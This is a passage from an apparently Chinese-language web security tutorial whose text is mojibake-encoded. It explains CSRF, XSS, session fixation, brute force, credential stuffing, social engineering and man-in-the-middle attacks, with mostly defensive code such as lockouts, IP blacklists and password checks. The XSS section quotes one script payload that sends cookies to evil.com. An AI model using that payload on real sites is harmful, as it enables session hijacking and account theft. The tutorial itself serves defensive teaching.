---
title: 16ã€å¸¸è§æ”»å‡»ä¸é˜²æŠ¤
---
## ğŸ“š ç›®å½•


1. [å¸¸è§Webå®‰å…¨æ”»å‡»](#1-å¸¸è§Webå®‰å…¨æ”»å‡»)
2. [æš´åŠ›ç ´è§£é˜²æŠ¤](#2-æš´åŠ›ç ´è§£é˜²æŠ¤)
3. [æ’åº“æ”»å‡»é˜²æŠ¤](#3-æ’åº“æ”»å‡»é˜²æŠ¤)
4. [ç¤¾ä¼šå·¥ç¨‹å­¦é˜²æŠ¤](#4-ç¤¾ä¼šå·¥ç¨‹å­¦é˜²æŠ¤)
5. [ä¸­é—´äººæ”»å‡»é˜²æŠ¤](#5-ä¸­é—´äººæ”»å‡»é˜²æŠ¤)
6. [é‡æ”¾æ”»å‡»é˜²æŠ¤](#6-é‡æ”¾æ”»å‡»é˜²æŠ¤)
7. [ä¼šè¯åŠ«æŒé˜²æŠ¤](#7-ä¼šè¯åŠ«æŒé˜²æŠ¤)
8. [æƒé™æå‡é˜²æŠ¤](#8-æƒé™æå‡é˜²æŠ¤)
9. [ç»¼åˆé˜²æŠ¤ç­–ç•¥](#9-ç»¼åˆé˜²æŠ¤ç­–ç•¥)

---

# 1. ğŸ”¥ å¸¸è§Webå®‰å…¨æ”»å‡»



## 1.1 CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ 



**ğŸ¯ ç®€å•ç†è§£**
CSRFå°±åƒæœ‰äººæ‹¿ç€ä½ çš„èº«ä»½è¯å»é“¶è¡Œå–é’±ã€‚å½“ä½ ç™»å½•äº†é“¶è¡Œç½‘ç«™åï¼Œé»‘å®¢é€šè¿‡æ¶æ„ç½‘ç«™å·å·è®©ä½ çš„æµè§ˆå™¨å‘é“¶è¡Œå‘é€è½¬è´¦è¯·æ±‚ã€‚

```
æ”»å‡»è¿‡ç¨‹ï¼š
ç”¨æˆ·Aç™»å½•é“¶è¡Œç½‘ç«™ â†’ è·å¾—èº«ä»½å‡­è¯(Cookie)
â†“
è®¿é—®æ¶æ„ç½‘ç«™B â†’ ç½‘ç«™Bå·å·å‘é€è½¬è´¦è¯·æ±‚
â†“
é“¶è¡Œæ”¶åˆ°è¯·æ±‚ â†’ çœ‹åˆ°æœ‰æ•ˆCookie â†’ æ‰§è¡Œè½¬è´¦
```

**ğŸ’¡ é˜²æŠ¤æªæ–½**
```html
<!-- CSRF Tokené˜²æŠ¤ -->
<form method="post" action="/transfer">
  <input type="hidden" name="csrf_token" value="abc123random" />
  <input type="text" name="amount" />
  <button type="submit">è½¬è´¦</button>
</form>
```

**æ ¸å¿ƒé˜²æŠ¤åŸç†**ï¼š
- **TokenéªŒè¯** - æ¯ä¸ªè¡¨å•éƒ½æœ‰å”¯ä¸€éšæœºä»¤ç‰Œ
- **Refereræ£€æŸ¥** - éªŒè¯è¯·æ±‚æ¥æºç½‘ç«™
- **SameSite Cookie** - é™åˆ¶è·¨ç«™è¯·æ±‚æºå¸¦Cookie

## 1.2 XSSè·¨ç«™è„šæœ¬æ”»å‡»



**ğŸ¯ ç®€å•ç†è§£**
XSSå°±åƒåœ¨ä½ å®¶é—¨å£è´´äº†ä¸ªå‡é€šçŸ¥ï¼Œè®©ä½ æŠŠé’±äº¤ç»™éª—å­ã€‚é»‘å®¢åœ¨ç½‘ç«™é‡Œæ³¨å…¥æ¶æ„è„šæœ¬ï¼Œå½“ä½ è®¿é—®æ—¶è„šæœ¬å·å–ä½ çš„ä¿¡æ¯ã€‚

```
æ”»å‡»ç¤ºä¾‹ï¼š
è¯„è®ºå†…å®¹ï¼š<script>document.location='http://evil.com?cookie='+document.cookie</script>
â†“
å…¶ä»–ç”¨æˆ·æŸ¥çœ‹è¯„è®º â†’ è„šæœ¬æ‰§è¡Œ â†’ Cookieè¢«å‘é€ç»™é»‘å®¢
```

**ğŸ’¡ é˜²æŠ¤æªæ–½**
```javascript
// è¾“å…¥è¿‡æ»¤å’Œè½¬ä¹‰
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// ä½¿ç”¨
const userInput = "<script>alert('hack')</script>";
const safeOutput = escapeHtml(userInput);
// ç»“æœï¼š&lt;script&gt;alert('hack')&lt;/script&gt;
```

**æ ¸å¿ƒé˜²æŠ¤ç­–ç•¥**ï¼š
- **è¾“å…¥éªŒè¯** - æ£€æŸ¥ç”¨æˆ·è¾“å…¥æ ¼å¼
- **è¾“å‡ºè½¬ä¹‰** - ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸ºå®‰å…¨å½¢å¼
- **CSPç­–ç•¥** - é™åˆ¶è„šæœ¬æ‰§è¡Œæ¥æº

## 1.3 ä¼šè¯å›ºå®šæ”»å‡»



**ğŸ¯ ç®€å•ç†è§£**
å°±åƒæœ‰äººæå‰æŠŠé”æ¢äº†ï¼Œç„¶åç­‰ä½ ç”¨ä»–çš„é’¥åŒ™å¼€é—¨ã€‚é»‘å®¢å…ˆè·å–ä¸€ä¸ªä¼šè¯IDï¼Œè¯±å¯¼ä½ ç”¨è¿™ä¸ªIDç™»å½•ï¼Œç„¶åä»–å°±èƒ½å†’å……ä½ ã€‚

```
æ”»å‡»æµç¨‹ï¼š
é»‘å®¢è·å–ä¼šè¯ID: JSESSIONID=HACKER123
â†“
è¯±å¯¼ç”¨æˆ·è®¿é—®: http://bank.com?JSESSIONID=HACKER123
â†“
ç”¨æˆ·ç™»å½• â†’ ä¼šè¯IDç»‘å®šç”¨æˆ·èº«ä»½
â†“
é»‘å®¢ä½¿ç”¨ç›¸åŒID â†’ å†’å……ç”¨æˆ·èº«ä»½
```

**ğŸ’¡ é˜²æŠ¤æªæ–½**
```javascript
// ç™»å½•æˆåŠŸåé‡æ–°ç”Ÿæˆä¼šè¯ID
app.post('/login', (req, res) => {
  if (validateUser(req.body.username, req.body.password)) {
    // é”€æ¯æ—§ä¼šè¯
    req.session.destroy();
    // é‡æ–°ç”Ÿæˆä¼šè¯ID
    req.session.regenerate(() => {
      req.session.userId = user.id;
      res.redirect('/dashboard');
    });
  }
});
```

## 1.4 Tokenæ³„éœ²é£é™©



**ğŸ¯ ç®€å•ç†è§£**
Tokenå°±åƒä½ çš„ä¸´æ—¶é€šè¡Œè¯ï¼Œå¦‚æœæ‰äº†è¢«åˆ«äººæ¡åˆ°ï¼Œå°±èƒ½å†’å……ä½ è¿›å…¥ç³»ç»Ÿã€‚

**å¸¸è§æ³„éœ²é€”å¾„**ï¼š
- **URLå‚æ•°** - `https://api.com/data?token=abc123`
- **æ—¥å¿—è®°å½•** - æœåŠ¡å™¨æ—¥å¿—è®°å½•äº†Token
- **æœ¬åœ°å­˜å‚¨** - localStorageè¢«XSSæ”»å‡»è¯»å–
- **ç½‘ç»œæŠ“åŒ…** - HTTPä¼ è¾“è¢«ç›‘å¬

**ğŸ’¡ é˜²æŠ¤ç­–ç•¥**
```javascript
// é”™è¯¯æ–¹å¼ï¼šTokenæ”¾åœ¨URL
âŒ fetch('/api/data?token=' + userToken)

// æ­£ç¡®æ–¹å¼ï¼šTokenæ”¾åœ¨Header
âœ… fetch('/api/data', {
  headers: {
    'Authorization': 'Bearer ' + userToken
  }
})
```

## 1.5 é‡æ”¾æ”»å‡»



**ğŸ¯ ç®€å•ç†è§£**
å°±åƒå½•éŸ³æœºæŠŠä½ è¯´çš„è¯å½•ä¸‹æ¥ï¼Œç„¶åé‡å¤æ’­æ”¾ã€‚é»‘å®¢æˆªè·ä½ çš„è¯·æ±‚ï¼Œç„¶åé‡å¤å‘é€æ¥å†’å……ä½ ã€‚

```
æ­£å¸¸è¯·æ±‚ï¼šç”¨æˆ· â†’ è½¬è´¦1000å…ƒ â†’ é“¶è¡Œ
é‡æ”¾æ”»å‡»ï¼šé»‘å®¢æˆªè·è¯·æ±‚ â†’ é‡å¤å‘é€10æ¬¡ â†’ é“¶è¡Œæ‰£æ¬¾10000å…ƒ
```

**ğŸ’¡ é˜²æŠ¤æªæ–½åœ¨åé¢ç« èŠ‚è¯¦ç»†è®²è§£**

---

# 2. ğŸ›¡ï¸ æš´åŠ›ç ´è§£é˜²æŠ¤



## 2.1 ä»€ä¹ˆæ˜¯æš´åŠ›ç ´è§£



**ğŸ¯ ç®€å•ç†è§£**
æš´åŠ›ç ´è§£å°±åƒå°å·æ‹¿ç€ä¸€å¤§ä¸²é’¥åŒ™ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•ä½ å®¶çš„é—¨é”ã€‚é»‘å®¢ç”¨ç¨‹åºè‡ªåŠ¨å°è¯•å¤§é‡å¯†ç ç»„åˆï¼Œç›´åˆ°æ‰¾åˆ°æ­£ç¡®çš„ã€‚

```
æš´åŠ›ç ´è§£è¿‡ç¨‹ï¼š
å°è¯•: admin/123456 â†’ å¤±è´¥
å°è¯•: admin/password â†’ å¤±è´¥  
å°è¯•: admin/admin123 â†’ æˆåŠŸï¼
```

## 2.2 è´¦æˆ·é”å®šæœºåˆ¶



**ğŸ’¡ æ ¸å¿ƒæ€è·¯**
å°±åƒATMæœºè¿ç»­è¾“é”™3æ¬¡å¯†ç å°±åå¡ï¼Œç½‘ç«™ä¹Ÿå¯ä»¥åœ¨å¤šæ¬¡å¤±è´¥åé”å®šè´¦æˆ·ã€‚

```javascript
// ç®€å•çš„è´¦æˆ·é”å®šé€»è¾‘
const loginAttempts = {}; // è®°å½•ç™»å½•å°è¯•æ¬¡æ•°

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const key = username;
  
  // æ£€æŸ¥æ˜¯å¦è¢«é”å®š
  if (loginAttempts[key] && loginAttempts[key].count >= 5) {
    return res.status(423).json({ error: 'è´¦æˆ·å·²è¢«é”å®š30åˆ†é’Ÿ' });
  }
  
  if (!validatePassword(username, password)) {
    // è®°å½•å¤±è´¥æ¬¡æ•°
    if (!loginAttempts[key]) {
      loginAttempts[key] = { count: 0, lockTime: null };
    }
    loginAttempts[key].count++;
    
    // 5æ¬¡å¤±è´¥åé”å®š
    if (loginAttempts[key].count >= 5) {
      loginAttempts[key].lockTime = Date.now() + 30 * 60 * 1000; // é”å®š30åˆ†é’Ÿ
    }
    
    return res.status(401).json({ error: 'å¯†ç é”™è¯¯' });
  }
  
  // ç™»å½•æˆåŠŸï¼Œæ¸…é™¤å¤±è´¥è®°å½•
  delete loginAttempts[key];
  res.json({ success: true });
});
```

**ğŸ”§ å®é™…é…ç½®è€ƒè™‘**ï¼š
- **å¤±è´¥æ¬¡æ•°é˜ˆå€¼** - é€šå¸¸3-5æ¬¡
- **é”å®šæ—¶é•¿** - 15åˆ†é’Ÿåˆ°2å°æ—¶
- **è§£é”æ–¹å¼** - æ—¶é—´è‡ªåŠ¨è§£é”æˆ–é‚®ä»¶/çŸ­ä¿¡éªŒè¯

## 2.3 éªŒè¯ç é˜²æŠ¤



**ğŸ¯ ç®€å•ç†è§£**
éªŒè¯ç å°±åƒé—¨å«é—®ä½ ä¸€ä¸ªåªæœ‰äººç±»èƒ½å›ç­”çš„é—®é¢˜ï¼Œæœºå™¨ç¨‹åºå¾ˆéš¾è‡ªåŠ¨å¤„ç†ã€‚

```html
<!-- å›¾ç‰‡éªŒè¯ç ç¤ºä¾‹ -->
<form>
  <input type="text" name="username" placeholder="ç”¨æˆ·å">
  <input type="password" name="password" placeholder="å¯†ç ">
  
  <!-- å¤šæ¬¡å¤±è´¥åæ˜¾ç¤ºéªŒè¯ç  -->
  <img src="/captcha/generate" id="captcha-img">
  <input type="text" name="captcha" placeholder="è¯·è¾“å…¥éªŒè¯ç ">
  
  <button type="submit">ç™»å½•</button>
</form>
```

**ç°ä»£éªŒè¯ç ç±»å‹**ï¼š
- **å›¾ç‰‡éªŒè¯ç ** - è¯†åˆ«æ‰­æ›²çš„å­—æ¯æ•°å­—
- **æ»‘åŠ¨éªŒè¯ç ** - æ‹–åŠ¨æ»‘å—å®Œæˆæ‹¼å›¾
- **è¡Œä¸ºéªŒè¯ç ** - ç‚¹å‡»å›¾ç‰‡ä¸­çš„ç‰¹å®šç‰©ä½“
- **æ— æ„ŸéªŒè¯** - åå°åˆ†æç”¨æˆ·è¡Œä¸ºæ¨¡å¼

## 2.4 IPé»‘åå•æœºåˆ¶



**ğŸ’¡ é˜²æŠ¤åŸç†**
å°±åƒå°åŒºä¿å®‰è®°ä½äº†å¯ç–‘äººå‘˜çš„é•¿ç›¸ï¼Œç¦æ­¢ä»–ä»¬è¿›å…¥ã€‚ç³»ç»Ÿè®°å½•æ”»å‡»IPåœ°å€å¹¶å±è”½ã€‚

```javascript
const blacklistIPs = new Set();
const ipAttempts = {};

function checkIPBlacklist(req, res, next) {
  const clientIP = req.ip;
  
  // æ£€æŸ¥æ˜¯å¦åœ¨é»‘åå•
  if (blacklistIPs.has(clientIP)) {
    return res.status(403).json({ error: 'IPå·²è¢«å°ç¦' });
  }
  
  // è®°å½•IPå°è¯•æ¬¡æ•°
  if (!ipAttempts[clientIP]) {
    ipAttempts[clientIP] = { count: 0, firstAttempt: Date.now() };
  }
  
  ipAttempts[clientIP].count++;
  
  // 1åˆ†é’Ÿå†…è¶…è¿‡20æ¬¡å°è¯•ï¼ŒåŠ å…¥é»‘åå•
  if (ipAttempts[clientIP].count > 20) {
    blacklistIPs.add(clientIP);
    console.log(`IP ${clientIP} å·²è¢«åŠ å…¥é»‘åå•`);
  }
  
  next();
}
```

## 2.5 åˆ†å¸ƒå¼æ”»å‡»åº”å¯¹



**ğŸ¯ æ”»å‡»ç‰¹å¾**
åˆ†å¸ƒå¼æ”»å‡»å°±åƒç»„ç»‡ä¸€ç¾¤äººåˆ†åˆ«å»è¯•ä¸åŒçš„é—¨ï¼Œæ¯ä¸ªäººè¯•çš„æ¬¡æ•°ä¸å¤šï¼Œä½†æ€»ä½“æ”»å‡»é‡å¾ˆå¤§ã€‚

```
ä¼ ç»Ÿæ”»å‡»ï¼šä¸€ä¸ªIPå°è¯•1000æ¬¡å¯†ç 
åˆ†å¸ƒå¼æ”»å‡»ï¼š1000ä¸ªIPå„å°è¯•1æ¬¡å¯†ç 
```

**ğŸ’¡ é«˜çº§é˜²æŠ¤ç­–ç•¥**
```javascript
// åŸºäºè¡Œä¸ºæ¨¡å¼çš„æ£€æµ‹
const behaviourAnalysis = {
  // æ£€æµ‹çŸ­æ—¶é—´å†…å¤§é‡ä¸åŒIPçš„ç›¸ä¼¼è¯·æ±‚
  detectDistributedAttack() {
    const recentRequests = getRecentFailedLogins(60); // æœ€è¿‘1åˆ†é’Ÿ
    const uniqueIPs = new Set(recentRequests.map(r => r.ip)).size;
    const totalAttempts = recentRequests.length;
    
    // å¦‚æœIPæ•°é‡å¤šä½†æ¯ä¸ªIPå°è¯•æ¬¡æ•°å°‘ï¼Œå¯èƒ½æ˜¯åˆ†å¸ƒå¼æ”»å‡»
    if (uniqueIPs > 50 && totalAttempts / uniqueIPs < 3) {
      triggerDistributedAttackAlert();
      return true;
    }
    return false;
  }
};
```

---

# 3. ğŸ¯ æ’åº“æ”»å‡»é˜²æŠ¤



## 3.1 ä»€ä¹ˆæ˜¯æ’åº“æ”»å‡»



**ğŸ¯ ç®€å•ç†è§£**
æ’åº“æ”»å‡»å°±åƒå°å·å·äº†ä¸€å †é’¥åŒ™ï¼Œç„¶åæŒ¨å®¶æŒ¨æˆ·å»è¯•ã€‚é»‘å®¢æ‹¿åˆ°å…¶ä»–ç½‘ç«™æ³„éœ²çš„ç”¨æˆ·åå¯†ç ï¼Œæ¥è¯•ä½ çš„ç½‘ç«™ã€‚

```
æ”»å‡»è¿‡ç¨‹ï¼š
é»‘å®¢è·å¾—æ•°æ®åº“ï¼š
- user1@email.com : password123
- user2@email.com : 123456  
- user3@email.com : qwerty
â†“
åœ¨ç›®æ ‡ç½‘ç«™æ‰¹é‡å°è¯•è¿™äº›è´¦å·å¯†ç ç»„åˆ
```

**ä¸ºä»€ä¹ˆæ’åº“æ”»å‡»æˆåŠŸç‡é«˜ï¼Ÿ**
- ç”¨æˆ·ä¹ æƒ¯åœ¨å¤šä¸ªç½‘ç«™ä½¿ç”¨ç›¸åŒå¯†ç 
- å¯†ç ç®€å•æ˜“çŒœï¼ˆ123456ã€passwordç­‰ï¼‰
- é‚®ç®±ä½œä¸ºé€šç”¨è´¦å·æ ‡è¯†

## 3.2 å¯†ç ç­–ç•¥é˜²æŠ¤



**ğŸ’¡ å¼ºå¯†ç è¦æ±‚**
```javascript
// å¯†ç å¼ºåº¦æ£€æŸ¥
function validatePassword(password) {
  const rules = {
    minLength: password.length >= 8,
    hasUpperCase: /[A-Z]/.test(password),
    hasLowerCase: /[a-z]/.test(password),
    hasNumbers: /\d/.test(password),
    hasSpecialChar: /[!@#$%^&*(),.?":{}|<>]/.test(password),
    notCommonPassword: !commonPasswords.includes(password.toLowerCase())
  };
  
  const passedRules = Object.values(rules).filter(Boolean).length;
  
  return {
    isValid: passedRules >= 4, // è‡³å°‘æ»¡è¶³4ä¸ªæ¡ä»¶
    score: passedRules,
    feedback: generatePasswordFeedback(rules)
  };
}

// å¸¸è§å¼±å¯†ç é»‘åå•
const commonPasswords = [
  '123456', 'password', 'admin', 'qwerty', 
  'letmein', 'welcome', 'monkey', 'dragon'
];
```

**å¯†ç ç­–ç•¥å»ºè®®**ï¼š
- **é•¿åº¦è¦æ±‚** - è‡³å°‘8ä½ï¼Œæ¨è12ä½ä»¥ä¸Š
- **å¤æ‚åº¦è¦æ±‚** - å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šå­—ç¬¦
- **é»‘åå•è¿‡æ»¤** - ç¦ç”¨å¸¸è§å¼±å¯†ç 
- **ä¸ªäººä¿¡æ¯æ£€æŸ¥** - ä¸å…è®¸åŒ…å«ç”¨æˆ·åã€é‚®ç®±ç­‰

## 3.3 å¼‚åœ°ç™»å½•æ£€æµ‹



**ğŸ¯ æ£€æµ‹åŸç†**
å°±åƒé“¶è¡Œå¡åœ¨å¼‚åœ°æ¶ˆè´¹æ—¶ä¼šå‘çŸ­ä¿¡æé†’ï¼Œç½‘ç«™ä¹Ÿå¯ä»¥æ£€æµ‹ç”¨æˆ·æ˜¯å¦åœ¨å¼‚å¸¸åœ°ç‚¹ç™»å½•ã€‚

```javascript
// å¼‚åœ°ç™»å½•æ£€æµ‹
async function checkGeolocation(req, userId) {
  const currentIP = req.ip;
  const currentLocation = await getLocationByIP(currentIP);
  
  // è·å–ç”¨æˆ·å†å²ç™»å½•åœ°ç‚¹
  const recentLogins = await getUserRecentLogins(userId, 30); // æœ€è¿‘30å¤©
  const commonLocations = recentLogins.map(login => login.location);
  
  // æ£€æŸ¥æ˜¯å¦ä¸ºå¼‚åœ°ç™»å½•
  const isUnusualLocation = !commonLocations.some(location => 
    calculateDistance(location, currentLocation) < 100 // 100å…¬é‡Œå†…
  );
  
  if (isUnusualLocation) {
    // å‘é€å¼‚åœ°ç™»å½•æé†’
    await sendLocationAlert(userId, currentLocation);
    
    // è¦æ±‚é¢å¤–éªŒè¯
    return {
      requireAdditionalVerification: true,
      message: 'æ£€æµ‹åˆ°å¼‚åœ°ç™»å½•ï¼Œè¯·è¿›è¡Œèº«ä»½éªŒè¯'
    };
  }
  
  return { requireAdditionalVerification: false };
}
```

## 3.4 è®¾å¤‡æŒ‡çº¹è¯†åˆ«



**ğŸ’¡ è®¾å¤‡æŒ‡çº¹æ¦‚å¿µ**
è®¾å¤‡æŒ‡çº¹å°±åƒæ¯å°è®¾å¤‡çš„"èº«ä»½è¯"ï¼Œé€šè¿‡æµè§ˆå™¨ã€æ“ä½œç³»ç»Ÿç­‰ä¿¡æ¯ç”Ÿæˆå”¯ä¸€æ ‡è¯†ã€‚

```javascript
// ç”Ÿæˆè®¾å¤‡æŒ‡çº¹
function generateDeviceFingerprint() {
  const fingerprint = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screenResolution: `${screen.width}x${screen.height}`,
    colorDepth: screen.colorDepth,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    plugins: Array.from(navigator.plugins).map(p => p.name).sort()
  };
  
  // ç”ŸæˆæŒ‡çº¹å“ˆå¸Œ
  return btoa(JSON.stringify(fingerprint)).slice(0, 32);
}

// æ–°è®¾å¤‡ç™»å½•æ£€æµ‹
function checkDeviceFingerprint(req, userId) {
  const currentFingerprint = req.headers['x-device-fingerprint'];
  const knownDevices = getUserKnownDevices(userId);
  
  if (!knownDevices.includes(currentFingerprint)) {
    return {
      isNewDevice: true,
      requireVerification: true,
      message: 'æ£€æµ‹åˆ°æ–°è®¾å¤‡ç™»å½•'
    };
  }
  
  return { isNewDevice: false };
}
```

## 3.5 è¡Œä¸ºåˆ†æé˜²æŠ¤



**ğŸ¯ å¼‚å¸¸è¡Œä¸ºè¯†åˆ«**
```javascript
// ç™»å½•è¡Œä¸ºåˆ†æ
const behaviorAnalyzer = {
  // åˆ†æç™»å½•æ—¶é—´æ¨¡å¼
  analyzeLoginTime(userId, currentTime) {
    const historicalLogins = getUserLoginHistory(userId);
    const usualHours = historicalLogins.map(login => 
      new Date(login.timestamp).getHours()
    );
    
    const currentHour = new Date(currentTime).getHours();
    const isUnusualTime = !usualHours.includes(currentHour);
    
    return { isUnusualTime, riskScore: isUnusualTime ? 30 : 0 };
  },
  
  // åˆ†æç™»å½•é¢‘ç‡
  analyzeLoginFrequency(userId) {
    const recentLogins = getUserRecentLogins(userId, 60); // æœ€è¿‘1å°æ—¶
    const loginCount = recentLogins.length;
    
    // 1å°æ—¶å†…è¶…è¿‡5æ¬¡ç™»å½•è§†ä¸ºå¼‚å¸¸
    const isFrequent = loginCount > 5;
    return { isFrequent, riskScore: isFrequent ? 40 : 0 };
  },
  
  // ç»¼åˆé£é™©è¯„ä¼°
  assessRisk(userId, loginContext) {
    let totalRisk = 0;
    
    totalRisk += this.analyzeLoginTime(userId, loginContext.timestamp).riskScore;
    totalRisk += this.analyzeLoginFrequency(userId).riskScore;
    
    if (totalRisk > 50) {
      return { highRisk: true, requireAdditionalAuth: true };
    }
    
    return { highRisk: false };
  }
};
```

---

# 4. ğŸ­ ç¤¾ä¼šå·¥ç¨‹å­¦é˜²æŠ¤



## 4.1 ä»€ä¹ˆæ˜¯ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»



**ğŸ¯ ç®€å•ç†è§£**
ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»å°±åƒéª—å­å†’å……é“¶è¡Œå·¥ä½œäººå‘˜ç»™ä½ æ‰“ç”µè¯ï¼Œå¥—å–ä½ çš„é“¶è¡Œå¡å¯†ç ã€‚æ”»å‡»è€…é€šè¿‡æ¬ºéª—ã€ä¼ªè£…ç­‰æ–¹å¼è·å–ç”¨æˆ·ä¿¡ä»»ï¼Œä»è€Œè·å¾—æ•æ„Ÿä¿¡æ¯ã€‚

**å¸¸è§æ”»å‡»æ‰‹æ®µ**ï¼š
```
é’“é±¼é‚®ä»¶ï¼šä¼ªè£…æˆå®˜æ–¹é‚®ä»¶ï¼Œè¯±å¯¼ç‚¹å‡»æ¶æ„é“¾æ¥
ç”µè¯è¯ˆéª—ï¼šå†’å……å®¢æœäººå‘˜ï¼Œå¥—å–å¯†ç ä¿¡æ¯  
è™šå‡ç½‘ç«™ï¼šåˆ¶ä½œå’Œå®˜ç½‘ç›¸ä¼¼çš„å‡ç½‘ç«™
å†…éƒ¨äººå‘˜ï¼šæ”¶ä¹°å†…éƒ¨å‘˜å·¥è·å–ä¿¡æ¯
ç‰©ç†æ¥è§¦ï¼šå‡æ‰®ç»´ä¿®äººå‘˜è¿›å…¥åŠå…¬åŒºåŸŸ
```

## 4.2 ç”¨æˆ·æ•™è‚²é˜²æŠ¤



**ğŸ’¡ ç”¨æˆ·å®‰å…¨æ„è¯†åŸ¹å…»**
```html
<!-- å®‰å…¨æç¤ºé¡µé¢ç¤ºä¾‹ -->
<div class="security-tips">
  <h3>ğŸ” å®‰å…¨æé†’</h3>
  
  <div class="tip-card">
    <h4>âŒ æˆ‘ä»¬ç»ä¸ä¼šï¼š</h4>
    <ul>
      <li>é€šè¿‡é‚®ä»¶æˆ–ç”µè¯ç´¢è¦æ‚¨çš„å¯†ç </li>
      <li>è¦æ±‚æ‚¨åœ¨é‚®ä»¶é“¾æ¥ä¸­è¾“å…¥æ•æ„Ÿä¿¡æ¯</li>
      <li>ç´§æ€¥è¦æ±‚æ‚¨è½¬è´¦æˆ–ä»˜æ¬¾</li>
    </ul>
  </div>
  
  <div class="tip-card">
    <h4>âœ… è¯·åŠ¡å¿…æ³¨æ„ï¼š</h4>
    <ul>
      <li>ç›´æ¥åœ¨åœ°å€æ è¾“å…¥æˆ‘ä»¬çš„å®˜ç½‘åœ°å€</li>
      <li>æŸ¥çœ‹ç½‘å€æ˜¯å¦ä¸º https://official-site.com</li>
      <li>æœ‰ç–‘é—®æ—¶è”ç³»æˆ‘ä»¬å®˜æ–¹å®¢æœéªŒè¯</li>
    </ul>
  </div>
</div>
```

## 4.3 æ•æ„Ÿæ“ä½œéªŒè¯



**ğŸ¯ å…³é”®æ“ä½œä¿æŠ¤**
å¯¹äºé‡è¦æ“ä½œå¢åŠ é¢å¤–éªŒè¯æ­¥éª¤ï¼Œé˜²æ­¢ç”¨æˆ·è¢«è¯±å¯¼æ“ä½œã€‚

```javascript
// æ•æ„Ÿæ“ä½œéœ€è¦äºŒæ¬¡ç¡®è®¤
const sensitiveOperations = [
  'changePassword',
  'transferMoney', 
  'deleteAccount',
  'changeEmail',
  'addPaymentMethod'
];

function requireAdditionalAuth(operation, req) {
  if (sensitiveOperations.includes(operation)) {
    return {
      requireSMS: true,
      requireEmail: true,
      message: 'ä¸ºäº†æ‚¨çš„è´¦æˆ·å®‰å…¨ï¼Œè¯·å®Œæˆèº«ä»½éªŒè¯'
    };
  }
  return { requireSMS: false };
}

// è½¬è´¦æ“ä½œç¤ºä¾‹
app.post('/transfer', async (req, res) => {
  const { amount, targetAccount, smsCode } = req.body;
  
  // å¤§é¢è½¬è´¦éœ€è¦çŸ­ä¿¡éªŒè¯
  if (amount > 10000) {
    const smsValid = await verifySMSCode(req.user.phone, smsCode);
    if (!smsValid) {
      return res.status(400).json({ 
        error: 'çŸ­ä¿¡éªŒè¯ç é”™è¯¯' 
      });
    }
  }
  
  // æ‰§è¡Œè½¬è´¦
  await processTransfer(req.user.id, targetAccount, amount);
  res.json({ success: true });
});
```

## 4.4 å¤šé‡ç¡®è®¤æœºåˆ¶



**ğŸ’¡ é‡è¦æ“ä½œå¤šé‡ä¿æŠ¤**
```javascript
// è´¦æˆ·åˆ é™¤çš„å¤šé‡ç¡®è®¤
app.delete('/account', async (req, res) => {
  const { 
    passwordConfirm,
    emailCode, 
    smsCode,
    confirmText 
  } = req.body;
  
  const verifications = [];
  
  // 1. å¯†ç éªŒè¯
  if (!await verifyPassword(req.user.id, passwordConfirm)) {
    verifications.push('å¯†ç éªŒè¯å¤±è´¥');
  }
  
  // 2. é‚®ä»¶éªŒè¯ç 
  if (!await verifyEmailCode(req.user.email, emailCode)) {
    verifications.push('é‚®ä»¶éªŒè¯ç é”™è¯¯');
  }
  
  // 3. çŸ­ä¿¡éªŒè¯ç 
  if (!await verifySMSCode(req.user.phone, smsCode)) {
    verifications.push('çŸ­ä¿¡éªŒè¯ç é”™è¯¯');
  }
  
  // 4. æ–‡æœ¬ç¡®è®¤
  if (confirmText !== 'DELETE MY ACCOUNT') {
    verifications.push('ç¡®è®¤æ–‡æœ¬ä¸æ­£ç¡®');
  }
  
  if (verifications.length > 0) {
    return res.status(400).json({ 
      errors: verifications 
    });
  }
  
  // æ‰€æœ‰éªŒè¯é€šè¿‡ï¼Œæ‰§è¡Œåˆ é™¤
  await deleteAccount(req.user.id);
  res.json({ message: 'è´¦æˆ·å·²åˆ é™¤' });
});
```

---

# 5. ğŸ” ä¸­é—´äººæ”»å‡»é˜²æŠ¤



## 5.1 ä»€ä¹ˆæ˜¯ä¸­é—´äººæ”»å‡»



**ğŸ¯ ç®€å•ç†è§£**
ä¸­é—´äººæ”»å‡»å°±åƒé‚®å±€çš„å·¥ä½œäººå‘˜å·çœ‹ä½ çš„ä¿¡ä»¶ã€‚é»‘å®¢åœ¨ä½ å’Œç½‘ç«™ä¹‹é—´æ’äº†ä¸€ä¸ª"ä»£ç†"ï¼Œå·å¬å’Œç¯¡æ”¹ä½ ä»¬çš„é€šä¿¡å†…å®¹ã€‚

```
æ­£å¸¸é€šä¿¡ï¼š
ç”¨æˆ· â†â†’ ç½‘ç«™

ä¸­é—´äººæ”»å‡»ï¼š
ç”¨æˆ· â†â†’ é»‘å®¢ â†â†’ ç½‘ç«™
       (å·å¬ç¯¡æ”¹)
```

**æ”»å‡»åœºæ™¯**ï¼š
- **å…¬å…±WiFi** - å’–å•¡å…ã€æœºåœºç­‰ä¸å®‰å…¨ç½‘ç»œ
- **DNSåŠ«æŒ** - ä¿®æ”¹åŸŸåè§£ææŒ‡å‘æ¶æ„æœåŠ¡å™¨
- **æ¶æ„ä»£ç†** - ç”¨æˆ·ä¸»åŠ¨é…ç½®äº†æ¶æ„ä»£ç†æœåŠ¡å™¨

## 5.2 HTTPSå¼ºåˆ¶ä½¿ç”¨



**ğŸ’¡ HTTP vs HTTPS**
```
HTTPï¼šæ˜æ–‡ä¼ è¾“ï¼Œå°±åƒå¯„æ˜ä¿¡ç‰‡
GET /login?username=admin&password=123456

HTTPSï¼šåŠ å¯†ä¼ è¾“ï¼Œå°±åƒå¯†å°çš„ä¿¡å°
GET /login (åŠ å¯†åçš„æ•°æ®)
```

**å¼ºåˆ¶HTTPSé…ç½®**
```javascript
// Express.js å¼ºåˆ¶HTTPS
app.use((req, res, next) => {
